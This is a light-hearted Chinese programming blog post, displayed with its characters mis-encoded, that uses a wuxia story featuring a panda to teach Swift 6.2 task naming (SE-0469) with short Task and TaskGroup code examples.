<p>â€œå‘³é“ä¸é”™ï¼Œå°±æ˜¯æœ‰ç‚¹çƒ«å˜´â€¦â€¦â€ä¾¯ä½©å¹äº†å¹çƒ­æ°”ï¼Œä¹ æƒ¯æ€§åœ°æ‘¸äº†æ‘¸å¤´é¡¶â€”â€”é‚£é‡Œæ¯›å‘æµ“å¯†ï¼Œ<strong>ç»å¯¹æ²¡æœ‰ç§ƒ</strong>ï¼Œè¿™è®©ä»–æ„Ÿåˆ°æ— æ¯”å®‰å¿ƒã€‚ä½œä¸ºä¸€åç»å¸¸è¿·è·¯çš„è·¯ç—´ï¼Œä»–åˆšæ‰æœ¬æ¥æƒ³å»å³¨çœ‰å±±çœ‹å¦¹å­ï¼Œç»“æœå¯¼èˆªæ¼‚ç§»ï¼Œä¸çŸ¥æ€ä¹ˆå°±æºœè¾¾åˆ°åå±±æ¥äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96e743d090264bb48788e7dbe4da9bdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=AlyexfBup0NwyXJQRCAmziKwDnY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¿½ç„¶ï¼Œä¸€é˜µå‡„å©‰çš„å“­å£°ä»ä»£ç å †æ ˆçš„æ·±å¤„ä¼ æ¥ã€‚</p>
<p>â€œå¹³ä¹‹â€¦â€¦å¹³ä¹‹â€¦â€¦ä½ åœ¨å“ªæ¡çº¿ç¨‹é‡Œå•Šï¼Ÿæˆ‘æ‰¾ä¸åˆ°ä½ â€¦â€¦â€</p>
<p>ä¾¯ä½©å®šç›ä¸€çœ‹ï¼Œåªè§ä¸€ä½èº«ç€ç¢§ç»¿è¡«å­çš„å°‘å¥³ï¼Œæ­£å¯¹ç€æ»¡å±æ»šåŠ¨çš„ Log æ—¥å¿—å‚æ³ªã€‚å¥¹å®¹è²Œæ¸…ä¸½ï¼Œå´ç¥è‰²å‡„è‹¦ï¼Œæ­£æ˜¯åå±±æ´¾æŒé—¨å²³ä¸ç¾¤ä¹‹å¥³ï¼Œ<strong>å²³çµçŠ</strong>ã€‚</p>
<p>â€œå²³å§‘å¨˜ï¼Ÿâ€ä¾¯ä½©æ“¦äº†æ“¦å˜´è§’çš„çº¢æ²¹ï¼Œâ€œä½ åœ¨è¿™å“­ä»€ä¹ˆï¼Ÿæ—å¹³ä¹‹é‚£å°å­åˆè·‘è·¯äº†ï¼Ÿâ€</p>
<p>å²³çµçŠæŠ¬èµ·æ³ªçœ¼ï¼ŒæŒ‡ç€å±å¹•ä¸Šå¯†å¯†éº»éº»çš„ <code>Task</code> åˆ—è¡¨ï¼šâ€œä¾¯å¤§å“¥ï¼Œæˆ‘å†™äº†ä¸€ä¸‡ä¸ªå¹¶å‘ä»»åŠ¡å»æœç´¢â€˜è¾Ÿé‚ªå‰‘è°±â€™çš„ä¸‹è½ã€‚åˆšæ‰æœ‰ä¸€ä¸ªä»»åŠ¡æŠ›å‡ºäº†å¼‚å¸¸ï¼ˆErrorï¼‰ï¼Œä½†æˆ‘ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ªï¼å®ƒä»¬å…¨éƒ½é•¿å¾—ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯åŒ¿åçš„ <code>Task</code>ï¼Œå°±åƒæ˜¯ä¸€ä¸‡ä¸ªæ²¡æœ‰è„¸çš„äººâ€¦â€¦æˆ‘æ‰¾ä¸åˆ°æˆ‘çš„å¹³ä¹‹äº†ï¼â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d49ccf88cec544928d3cf947e9c76565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=7KU%2BRTrDrggAIXciou7kRn5ZEh0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¾¯ä½©å‡‘è¿‡å»ä¸€çœ‹ï¼Œæœç„¶ï¼Œè°ƒè¯•å™¨é‡Œçš„ä»»åŠ¡å…¨æ˜¯ <code>Unspecified</code>ï¼Œæ ¹æœ¬åˆ†ä¸æ¸…è°æ˜¯è°ã€‚</p>
<p><strong>åœ¨æœ¬æ¬¡å¤§å†’é™©ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>0ï¸âƒ£ ğŸ¼ åºç« ï¼šèµ›åšåå±±çš„â€œæ— åâ€å­¤é­‚</li>
<li>1ï¸âƒ£ ğŸ·ï¸ æ‹’ç»åŒ¿åï¼šç»™ä»»åŠ¡ä¸€å¼ èº«ä»½è¯</li>
<li>ç®€å•çš„èµ·åè‰ºæœ¯</li>
<li>2ï¸âƒ£ ğŸ—ï¸ å®æˆ˜æ¼”ç»ƒï¼šæ±Ÿæ¹–å°æŠ¥çš„å¹¶å‘é‡‡é›†</li>
<li>3ï¸âƒ£ ğŸ’” å²³çµçŠçš„é¡¿æ‚Ÿ</li>
<li>4ï¸âƒ£ ğŸ¼ ç†ŠçŒ«çš„å“²å­¦æ—¶åˆ»</li>
<li>5ï¸âƒ£ ğŸ›‘ å°¾å£°ï¼šç«¹ç¬‹çš„æ”¶çº³éš¾é¢˜</li>
</ul>
<p>â€œå”‰ï¼Œâ€ä¾¯ä½©å¹äº†å£æ°”ï¼Œé¢‡ä¸ºåŒæƒ…ï¼Œâ€œè¿™å°±æ˜¯â€˜åŒ¿åå¹¶å‘â€™çš„ç—›å•Šã€‚å‡ºäº†äº‹ï¼Œæƒ³æ‰¾ä¸ªèƒŒé”…çš„éƒ½æ‰¾ä¸åˆ°ã€‚ä¸è¿‡ï¼ŒSwift 6.2 ç»™äº†æˆ‘ä»¬ä¸€æ‹›â€˜å®ååˆ¶â€™å‰‘æ³•ï¼Œæ­£å¥½èƒ½è§£ä½ çš„ç›¸æ€ä¹‹è‹¦ã€‚â€</p>
<p>è¿™ä¾¿æ˜¯ <strong>SE-0469: Task Naming</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/719f037b47de4184914d6e2a0f2de6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=tlKzmFtLk3lgeM1y%2Be%2BAOgwnjX8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">1ï¸âƒ£ ğŸ·ï¸ æ‹’ç»åŒ¿åï¼šç»™ä»»åŠ¡ä¸€å¼ èº«ä»½è¯</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0070d025c8d471d84e7f32cf1502b54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=LWPJ8C%2Fbw2nCEwyX4f0BtQhVGVA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>åœ¨ Swift 6.2 ä¹‹å‰ï¼Œåˆ›å»º <code>Task</code> å°±åƒæ˜¯åå±±æ´¾æ‹›æ”¶äº†ä¸€æ‰¹è’™é¢å¼Ÿå­ï¼Œå¹²æ´»çš„æ—¶å€™æŒºå–åŠ›ï¼Œä½†ä¸€æ—¦æœ‰äººå·æ‡’æˆ–è€…èµ°ç«å…¥é­”ï¼ˆCrash/Hangï¼‰ï¼Œä½ æ ¹æœ¬ä¸çŸ¥é“æ˜¯è°å¹²çš„ã€‚</p>
<p>å²³çµçŠæ“¦å¹²çœ¼æ³ªï¼šâ€œä½ æ˜¯è¯´ï¼Œæˆ‘å¯ä»¥ç»™å¹³ä¹‹â€¦â€¦å“¦ä¸ï¼Œç»™ä»»åŠ¡èµ·åå­—ï¼Ÿâ€</p>
<p>â€œæ²¡é”™ï¼â€ä¾¯ä½©æ‰“äº†ä¸ªå“æŒ‡ï¼Œâ€œSE-0469 å…è®¸æˆ‘ä»¬åœ¨åˆ›å»ºä»»åŠ¡æ—¶ï¼Œé€šè¿‡ <code>name</code> å‚æ•°ç»™å®ƒæŒ‚ä¸ªç‰Œã€‚æ— è®ºæ˜¯è°ƒè¯•è¿˜æ˜¯æ—¥å¿—è®°å½•ï¼Œéƒ½èƒ½ç›´æ¥çœ‹åˆ°åå­—ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/540522691512436ea0d0babb01767a2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=jV9Fneob2lWK4TsLstlSe9OjflI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™å¥— API éå¸¸ç®€å•ç›´è§‚ï¼šå½“ä½¿ç”¨ <code>Task.init()</code>ã€<code>Task.detached()</code> åˆ›å»ºæ–°ä»»åŠ¡ï¼Œæˆ–è€…åœ¨ä»»åŠ¡ç»„ä¸­ä½¿ç”¨ <code>addTask()</code> æ—¶ï¼Œéƒ½å¯ä»¥ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºåå­—ã€‚</p>
<h3 data-id="heading-2">ç®€å•çš„èµ·åè‰ºæœ¯</h3>
<p>ä¾¯ä½©å½“å³åœ¨å…¨æ¯å±ä¸Šæ¼”ç¤ºäº†ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ä»¥å‰æˆ‘ä»¬åªèƒ½ç›²äººæ‘¸è±¡</span>
<span class="hljs-comment">// ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä»»åŠ¡èµåï¼</span>
<span class="hljs-keyword">let</span> task <span class="hljs-operator">=</span> <span class="hljs-type">Task</span>(name: <span class="hljs-string">"å¯»æ‰¾æ—å¹³ä¹‹ä¸“ç”¨ä»»åŠ¡"</span>) {
    <span class="hljs-comment">// åœ¨ä»»åŠ¡å†…éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–å½“å‰çš„åå­—</span>
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰åå­—ï¼Œå°±æ˜¯ "Unknown"ï¼ˆæ— åæ°ï¼‰</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å½“å‰è¿è¡Œçš„ä»»åŠ¡æ˜¯: <span class="hljs-subst">\(Task.name <span class="hljs-operator">??</span> <span class="hljs-string">"Unknown"</span>)</span>"</span>)
    
    <span class="hljs-comment">// å‡è£…åœ¨å¹²æ´»</span>
    <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .seconds(<span class="hljs-number">1</span>))
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dedf78a5711b4ae193d207d2c431ca71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=57CdGQ8TJOGuT0i3Ahm0DMWXHfQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œçœ‹ï¼Œâ€ä¾¯ä½©æŒ‡ç€æ§åˆ¶å°ï¼Œâ€œç°åœ¨å®ƒä¸å†æ˜¯å†·å†°å†°çš„å†…å­˜åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªæœ‰è¡€æœ‰è‚‰ã€æœ‰åå­—çš„â€˜å¯»æ‰¾æ—å¹³ä¹‹ä¸“ç”¨ä»»åŠ¡â€™äº†ã€‚â€</p>
<h2 data-id="heading-3">2ï¸âƒ£ ğŸ—ï¸ å®æˆ˜æ¼”ç»ƒï¼šæ±Ÿæ¹–å°æŠ¥çš„å¹¶å‘é‡‡é›†</h2>
<p>â€œå…‰æœ‰ä¸ªåå­—æœ‰ä»€ä¹ˆç”¨ï¼Ÿâ€å²³çµçŠè¿˜æ˜¯æœ‰ç‚¹æ„çœ‰ä¸å±•ï¼Œâ€œæˆ‘æœ‰é‚£ä¹ˆå¤šä¸ªä»»åŠ¡åœ¨è·‘ï¼Œä¸‡ä¸€å‡ºé”™çš„æ˜¯ç¬¬ 9527 å·å‘¢ï¼Ÿâ€</p>
<p>â€œé—®å¾—å¥½ï¼â€ä¾¯ä½©å’¬äº†ä¸€å£ç«¹ç¬‹ï¼Œæ‘†å‡ºä¸€å‰¯é«˜æ·±è«æµ‹çš„æ ·å­ï¼ˆè™½ç„¶å˜´è§’è¿˜æŒ‚ç€ç¬‹æ¸£ï¼‰ï¼Œâ€œè¿™åå­—ä¸ä»…å¯ä»¥ç¡¬ç¼–ç ï¼Œè¿˜æ”¯æŒ<strong>å­—ç¬¦ä¸²æ’å€¼</strong>ï¼è¿™åœ¨å¤„ç†æ‰¹é‡ä»»åŠ¡æ—¶ç®€ç›´æ˜¯ç¥æŠ€ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9ba3a908fc244568dea7fa16e8806a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=tr2n92ReTRJQTjil2zW2dL68iPA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å‡è®¾æˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªç»“æ„ä½“æ¥é€šè¿‡ç½‘ç»œåŠ è½½æ±Ÿæ¹–æ–°é—»ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">NewsStory</span>: <span class="hljs-title class_">Decodable</span>, <span class="hljs-title class_">Identifiable</span> {
    <span class="hljs-keyword">let</span> id: <span class="hljs-type">Int</span>
    <span class="hljs-keyword">let</span> title: <span class="hljs-type">String</span> <span class="hljs-comment">// æ¯”å¦‚ "ä»¤ç‹å†²å› é…—é…’è¢«ç½šæ¬¾"</span>
    <span class="hljs-keyword">let</span> strap: <span class="hljs-type">String</span>
    <span class="hljs-keyword">let</span> url: <span class="hljs-type">URL</span>
}
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>TaskGroup</code> æ´¾å‡ºå¤šåæ¢å­ï¼ˆå­ä»»åŠ¡ï¼‰å»æ‰“æ¢æ¶ˆæ¯ã€‚å¦‚æœæœ‰æ¢å­å›æŠ¥å¤±è´¥ï¼Œæˆ‘ä»¬éœ€è¦ç«‹åˆ»çŸ¥é“æ˜¯å“ªä¸€è·¯æ¢å­å‡ºäº†é—®é¢˜ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> stories <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> withTaskGroup { group <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">5</span> {
        <span class="hljs-comment">// å…³é”®ç‚¹æ¥äº†ï¼ğŸ‘‡</span>
        <span class="hljs-comment">// æˆ‘ä»¬åœ¨æ·»åŠ ä»»åŠ¡æ—¶ï¼ŒåŠ¨æ€åœ°ç»™å®ƒç”Ÿæˆäº†åå­—ï¼š "Stories 1", "Stories 2"...</span>
        <span class="hljs-comment">// è¿™å°±åƒæ˜¯å²³ä¸ç¾¤ç»™å¼Ÿå­ä»¬æ’è¾ˆåˆ†ï¼Œä¸€ç›®äº†ç„¶ã€‚</span>
        group.addTask(name: <span class="hljs-string">"æ±Ÿæ¹–å¿«æŠ¥åˆ†é˜Ÿ-<span class="hljs-subst">\(i)</span>"</span>) {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://hws.dev/news-<span class="hljs-subst">\(i)</span>.json"</span>)<span class="hljs-operator">!</span>
                <span class="hljs-keyword">let</span> (data, <span class="hljs-keyword">_</span>) <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">URLSession</span>.shared.data(from: url)
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-type">JSONDecoder</span>().decode([<span class="hljs-type">NewsStory</span>].<span class="hljs-keyword">self</span>, from: data)
            } <span class="hljs-keyword">catch</span> {
                <span class="hljs-comment">// ğŸš¨ å‡ºäº‹äº†ï¼</span>
                <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰“å°å‡º Task.name</span>
                <span class="hljs-comment">// è¾“å‡ºç¤ºä¾‹ï¼š"Loading æ±Ÿæ¹–å¿«æŠ¥åˆ†é˜Ÿ-3 failed."</span>
                <span class="hljs-comment">// å²³çµçŠç¬é—´å°±èƒ½çŸ¥é“æ˜¯ç¬¬ 3 åˆ†é˜Ÿè¢«é’åŸæ´¾æˆªæ€äº†ï¼</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ è½½å¤±è´¥ï¼Œè‚‡äº‹è€…æ˜¯: <span class="hljs-subst">\(Task.name <span class="hljs-operator">??</span> <span class="hljs-string">"Unknown"</span>)</span>"</span>)
                <span class="hljs-keyword">return</span> []
            }
        }
    }

    <span class="hljs-keyword">var</span> allStories <span class="hljs-operator">=</span> [<span class="hljs-type">NewsStory</span>]()

    <span class="hljs-comment">// æ”¶é›†æƒ…æŠ¥</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> stories <span class="hljs-keyword">in</span> group {
        allStories.append(contentsOf: stories)
    }

    <span class="hljs-comment">// æŒ‰ ID æ’åºï¼Œä¿æŒé˜Ÿå½¢</span>
    <span class="hljs-keyword">return</span> allStories.sorted { <span class="hljs-variable">$0</span>.id <span class="hljs-operator">&gt;</span> <span class="hljs-variable">$1</span>.id }
}

<span class="hljs-built_in">print</span>(stories)
</code></pre>
<h2 data-id="heading-4">3ï¸âƒ£ ğŸ’” å²³çµçŠçš„é¡¿æ‚Ÿ</h2>
<p>çœ‹å®Œè¿™æ®µä»£ç ï¼Œå²³çµçŠç ´æ¶•ä¸ºç¬‘ï¼šâ€œå¤ªå¥½äº†ï¼è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœâ€˜å¯»æ‰¾å¹³ä¹‹â€™çš„ä»»åŠ¡å¤±è´¥äº†ï¼Œæˆ‘å°±èƒ½ç«‹åˆ»çŸ¥é“æ˜¯å“ªä¸€æ¬¡å°è¯•å¤±è´¥çš„ï¼Œæ˜¯åœ¨ç¦å·å¤±è´¥çš„ï¼Œè¿˜æ˜¯åœ¨æ´›é˜³å¤±è´¥çš„ï¼Œå†ä¹Ÿä¸ç”¨å¯¹ç€è™šç©ºå“­æ³£äº†ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/914ba42826894963b8e27cf710668643~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=vPdTlvIpZprRT1ysSChBgUHRFps%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¾¯ä½©ç‚¹ç‚¹å¤´ï¼Œè¯­é‡å¿ƒé•¿åœ°è¯´ï¼šâ€œåœ¨å¹¶å‘çš„ä¸–ç•Œé‡Œï¼Œ<strong>å¯è§æ€§ï¼ˆVisibilityï¼‰</strong> å°±æ˜¯ç”Ÿå‘½çº¿ã€‚ä¸€ä¸ªæœªå‘½åçš„ä»»åŠ¡ï¼Œå°±æ˜¯ unpredictableï¼ˆä¸å¯é¢„æµ‹ï¼‰çš„é£é™©ã€‚ç»™äº†å®ƒåå­—ï¼Œå°±æ˜¯ç»™äº†å®ƒè´£ä»»ã€‚å¦‚æœå®ƒè·‘è·¯äº†ï¼ˆRogue Taskï¼‰ï¼Œæˆ‘ä»¬è‡³å°‘çŸ¥é“é€šç¼‰ä»¤ä¸Šè¯¥å†™è°çš„åå­—ã€‚â€</p>
<p>å²³çµçŠçœ‹ç€å±å¹•ä¸Šä¸€ä¸ªä¸ªæ¸…æ™°çš„ä»»åŠ¡åç§°ï¼Œçœ¼ä¸­é—ªè¿‡ä¸€ä¸å¤æ‚çš„ç¥è‰²ï¼šâ€œæ˜¯å•Šï¼Œåå­—å¾ˆé‡è¦ã€‚å¯æƒœï¼Œæœ‰äº›äººçš„åå­—ï¼Œåˆ»åœ¨äº†å¿ƒä¸Šï¼Œå´åœ¨æ±Ÿæ¹–é‡Œä¸¢äº†â€¦â€¦â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c748073b704cb0a028684573cbd441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=gOZoh9kWe8a618uiqaW3RGenERk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œåœåœåœï¼â€ä¾¯ä½©èµ¶ç´§æ‰“æ–­å¥¹ï¼Œç”Ÿæ€•å¥¹åˆå”±èµ·é‚£é¦–ç¦å»ºå±±æ­Œï¼Œâ€œå’±ä»¬æ˜¯ææŠ€æœ¯çš„ï¼Œä¸å…´æä¼¤ç—•æ–‡å­¦ã€‚ç°åœ¨çš„é‡ç‚¹æ˜¯ï¼Œä½ çš„ Debug æ•ˆç‡æå‡äº† 1000%ï¼â€</p>
<h2 data-id="heading-5">4ï¸âƒ£ ğŸ¼ ç†ŠçŒ«çš„å“²å­¦æ—¶åˆ»</h2>
<p>ä¾¯ä½©ç«™èµ·èº«ï¼Œæ‹äº†æ‹å±è‚¡ä¸Šçš„ç°å°˜ï¼ˆè™½ç„¶æ˜¯å…¨æ¯æŠ•å½±ï¼Œä½†ä»–è§‰å¾—è¦æœ‰ä»ªå¼æ„Ÿï¼‰ã€‚</p>
<p>â€œå…¶å®ï¼Œç»™ä»£ç èµ·åå­—å’Œåšç†Šä¸€æ ·ã€‚æˆ‘å«ä¾¯ä½©ï¼Œæ‰€ä»¥æˆ‘çŸ¥é“æˆ‘è¦åƒç«¹ç¬‹ï¼Œæˆ‘çŸ¥é“æˆ‘<strong>å¤´ç»å¯¹ä¸ç§ƒ</strong>ï¼Œæˆ‘çŸ¥é“æˆ‘è¦èµ°å“ªæ¡è·¯ï¼ˆè™½ç„¶ç»å¸¸èµ°é”™ï¼‰ã€‚å¦‚æœæˆ‘åªæ˜¯ä¸€åªâ€˜Anonymous Pandaâ€™ï¼Œé‚£æˆ‘å¯èƒ½æ—©å°±è¢«æŠ“å»åŠ¨ç‰©å›­æ‰“å·¥äº†ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b286db7711e45298f22ddd6364946ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=hSVF1QZjE5nKpNb7pXH%2FTzNTcK0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œå–„ç”¨ <code>Task Naming</code>ï¼Œâ€ä¾¯ä½©æ€»ç»“é“ï¼Œâ€œå®ƒä¸ä¼šå¢åŠ è¿è¡Œæ—¶çš„è´Ÿæ‹…ï¼Œä½†åœ¨ä½ ç„¦å¤´çƒ‚é¢ä¿® Bug çš„æ—¶å€™ï¼Œå®ƒå°±æ˜¯é‚£ä¸ªä¸ºä½ æŒ‡ç‚¹è¿·æ´¥çš„â€˜é£æ¸…æ‰¬â€™ã€‚â€</p>
<h2 data-id="heading-6">5ï¸âƒ£ ğŸ›‘ å°¾å£°ï¼šç«¹ç¬‹çš„æ”¶çº³éš¾é¢˜</h2>
<p>å¸®å²³çµçŠè§£å†³äº†å¿ƒç—…ï¼Œä¾¯ä½©å‡†å¤‡æ”¶æ‹¾ä¸œè¥¿ç¦»å¼€èµ›åšåå±±ã€‚ä»–çœ‹ç€è‡ªå·±è¿˜æ²¡åƒå®Œçš„ä¸€å¤§å †ç«¹ç¬‹ï¼Œé™·å…¥äº†æ²‰æ€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/926c282b3afa47d488cef63830e7fa65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=duleFud%2BA5PVn40nVoAOT3w7LuQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œè¿™ç«¹ç¬‹å¤ªå¤šäº†ï¼Œâ€ä¾¯ä½©å˜Ÿå›”ç€ï¼Œâ€œç”¨æ™®é€šçš„ <code>Array</code> è£…å§ï¼Œå¤ªçµæ´»ï¼Œå†…å­˜è·³æ¥è·³å»çš„ï¼Œå½±å“æˆ‘æ‹”åˆ€ï¼ˆåƒç¬‹ï¼‰çš„é€Ÿåº¦ã€‚ç”¨ <code>Tuple</code> å…ƒç»„è£…å§ï¼Œå›ºå®šæ˜¯å›ºå®šäº†ï¼Œä½†è¿™å†™æ³•ä¹Ÿå¤ªä¸‘äº†ï¼Œè€Œä¸”è¿˜æ²¡æ³•ç”¨ä¸‹æ ‡å¾ªç¯è®¿é—®â€¦â€¦â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2eea1f2013f243319cf9965804204a68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=TYux%2BkYuJgd5Hf%2B44q%2FKuZm70wM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å²³çµçŠçœ‹ç€ä¾¯ä½©å¯¹ç€ä¸€å †ç«¹ç¬‹å‘æ„ï¼Œå¿ä¸ä½é—®é“ï¼šâ€œä¾¯å¤§å“¥ï¼Œä½ æ˜¯æƒ³è¦ä¸€ä¸ªæ—¢æœ‰å…ƒç»„çš„â€˜å›ºå®šå¤§å°â€™è¶…èƒ½åŠ›ï¼Œåˆæœ‰æ•°ç»„çš„â€˜ä¸‹æ ‡è®¿é—®â€™ä¾¿æ·æ€§çš„å®¹å™¨å—ï¼Ÿâ€</p>
<p>ä¾¯ä½©çœ¼ç›ä¸€äº®ï¼šâ€œçŸ¥æˆ‘è€…ï¼Œå²³å§‘å¨˜ä¹Ÿï¼éš¾é“ Swift 6.2 è¿è¿™ä¸ªéƒ½æœ‰ï¼Ÿâ€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb4688518ee54019bc8222cb5a6227c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=ZyFYeIkmW0XGJzOjn2xstXpzPvo%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å²³çµçŠå¾®å¾®ä¸€ç¬‘ï¼ŒæŒ‡å‘äº†ä¸‹ä¸€ç« çš„ä¼ é€é—¨ï¼šâ€œå¬è¯´ä¸‹ä¸€å›ï¼Œæœ‰ä¸€ç§ç¥å¥‡çš„å…µå™¨ï¼Œå«åš <strong>InlineArray</strong>ï¼Œä¸“é—¨æ²»æ„ˆä½ çš„â€˜æ€§èƒ½å¼ºè¿«ç—‡â€™ã€‚â€</p>
